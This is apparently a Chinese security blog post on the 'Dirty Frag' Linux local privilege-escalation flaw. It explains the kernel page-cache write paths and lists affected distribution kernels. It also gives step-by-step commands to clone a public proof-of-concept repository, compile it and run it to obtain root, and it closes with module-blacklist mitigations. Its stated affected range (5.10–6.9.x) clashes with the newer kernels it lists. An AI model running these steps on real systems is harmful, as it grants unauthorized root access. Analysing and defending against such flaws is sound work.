#  Dirty Frag：Linux 本地提权漏洞  
 StudySec   2026-05-08 05:07  
  
## 前言  
  
本文主要介绍 Dirty Frag 漏洞。它是一条已经被公开命名的 Linux 本地提权漏洞利用链，核心问题在于攻击者可以借助特定内核路径，将原本不应被覆盖的数据页重新映射到可写场景中，最终实现对关键内容的篡改。  
  
漏洞简介  
  
Dirty Frag、Dirty Pipe  
 和   
Copy Fail  
 可以视为同一类问题的不同表现形式。不过三者的落点并不完全相同：Dirty Pipe 的核心在于覆盖   
struct pipe_buffer  
，而 Dirty Frag 的关键则在于通过   
frag  
 路径影响   
struct sk_buff  
。  
  
在 Copy Fail 类攻击中，攻击者会借助   
splice(file -> pipe -> AF_ALG_fd)  
 之类的机制，将自己锁定的页缓存植入发送侧的单链表传输结构（TX SGL）中。随后在内部   
recv()  
 过程中，TX SGL 末尾的 4 个字节（标签）会被拆分到   
areq->tsgl  
，再通过相关机制链接到接收侧单链表传输结构（RX SGL）的尾部   
sg_chain  
。当执行   
aead_request_set_crypt(req, src=RX, dst=RX)  
 时，内核会选择原地处理模式；在字节重排阶段，  
scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, 1)  
 会把 4 个字节的临时数据写入目标地址   
seqno_lo  
（即   
dst  
）的末尾。  
  
在正常的 IPsec 数据处理路径中，这个位置本应处于 skb 的标签区域，因此这次写入通常不会造成问题。但如果攻击者事先将受控的页缓存布置到这里，那么这一“默认安全”的前提就会失效，漏洞也就由此产生。  
  
可以将 Dirty Frag 理解为：上述相似的写入模式，被复制到了由拼接产生的非线性 skb 片段之上，从而引发页缓存写入问题。  
- xfrm-ESP Page-Cache Write：  
esp_input  
 绕过   
skb_cow_data  
，并让   
crypto_authenc_esn_decrypt  
 直接在片段上运行。  
  
- RxRPC Page-Cache Write：  
rxkad_verify_packet_1  
 会在片段上执行原地单块解密，即   
pcbc(fcrypt)  
。  
  
需要注意的是，无论   
algif_aead  
 模块是否可用，Dirty Frag 都有可能被触发。换句话说，即便系统已经应用了 Copy Fail 公开缓解方案中的   
algif_aead  
 黑名单策略，也依然可能受到 Dirty Frag 的影响。  
## 影响版本  
- Ubuntu 24.04.4：6.17.0-23-通用  
  
- RHEL 10.1：6.12.0-124.49.1.el10_1.x86_64  
  
- openSUSE Tumbleweed：7.0.2-1-default  
  
- CentOS Stream 10：6.12.0-224.el10.x86_64  
  
- AlmaLinux 10：6.12.0-124.52.3.el10_1.x86_64  
  
- Fedora 44：6.19.14-300.fc44.x86_64  
  
- ...  
  
xfrm-ESP 页面缓存写入路径：  
cac2661c53f3  
（2017-01-17）进入上游  
  
RxRPC 页面缓存写入路径：  
2dc334f1a63a  
（2023-06）进入上游  
  
## 测试环境  
  
Ubuntu 22.04（受影响版本均可）  
## POC 地址  
  
https://github.com/V4bel/dirtyfrag  
## 漏洞复现  
  
首先，需要确认当前内核版本是否位于受影响范围内（Linux Kernel 5.10 至 6.9.x），并检查   
esp4  
、  
esp6  
、  
rxrpc  
 这三个内核模块是否已经加载。  
```
//查看内核版本，确认存在该漏洞
uname -r
//查看内核模块，确认esp4, esp6, rxrpc 三个内核模块是否已加载。
lsmod | egrep '^(esp4|esp6|rxrpc)'
//如果没有输出就证明没有被加载，但是我们这个漏洞的利用程序会尝试自动加载所需的模块，只要模块文件存在且未被禁用，漏洞依然可以被成功触发。
//也可以查看一下这三个模块是否存在
ls /lib/modules/$(uname -r)/kernel/net/ipv4/esp4.ko
ls /lib/modules/$(uname -r)/kernel/net/ipv6/esp6.ko
ls /lib/modules/$(uname -r)/kernel/net/rxrpc/rxrpc.ko
```  
  
确认无误后，就可以下载、编译并执行该漏洞的利用程序。（这里需要能够访问 GitHub；如果下载失败，通常需要检查代理或网络连通性。）  
```
//1. 方法一：从GitHub克隆漏洞利用的源代码
git clone https://github.com/V4bel/dirtyfrag.git
//1. 方法二：由于我们这里是测试环境，可在本机访问https://github.com/V4bel/dirtyfrag下载源码，然后用scp传进去也可以

//2. 进入项目目录
cd dirtyfrag
//3. 编译源代码，生成名为 'exp' 的漏洞利用程序
gcc -O0 -Wall -o exp exp.c -lutil
//4. 执行漏洞利用程序
./exp
```  
  
程序运行成功后，通常就能直接获得 root 权限。此时可以通过输入   
whoami  
 进行验证；从下面的结果也可以看出，漏洞利用已经成功。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XY4rYdicCcZeoL7EtASqLvJo0NibFJYDe3g86kIPmWxH2L7bQ1iac3BNc5bR8BD5EjZBicbb4pfmC9MpfRgHFKoNGwBGvK90rF3pxjfCBf2UPXQ/640?wx_fmt=png&from=appmsg "")  
## 后续建议  
1. **立即采取临时缓解措施**  
（适用于暂时无法打补丁的场景）：  
```
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"
```  
  
1.   
1. 该操作会彻底禁用上述三个存在风险的模块；如果当前业务依赖 IPsec ESP 或 RxRPC，请务必先评估影响后再执行。  
  
1. **持续关注官方安全更新**  
：  
  
1. Ubuntu 用户可订阅   
USN  
 安全通知，待内核补丁发布后及时升级。  
  
1. 其他发行版用户也应持续关注各自的内核更新公告与安全通报。  
  
1. **加强系统纵深防御**  
：  
  
1. 严格限制本地用户权限，落实最小权限原则。  
  
1. 部署 LSM（如 AppArmor、SELinux），降低漏洞被利用后的影响面。  
  
1. 定期审计异常进程行为，以及可疑的内核模块加载记录。  
  
## 结语  
  
Dirty Frag 的危险性不只在于“可提权”本身，更在于它揭示了内核数据路径中一些原本默认可信的边界，在特定条件下其实并不牢靠。对于运维和安全人员来说，这类漏洞的价值不仅是补丁层面的修复，更是一次对系统最小权限、模块暴露面、异常行为监控能力的复盘机会。面对本地提权问题，及时更新内核、减少不必要的模块加载，并建立持续性的检测与响应机制，往往比单次修补更重要。  
  
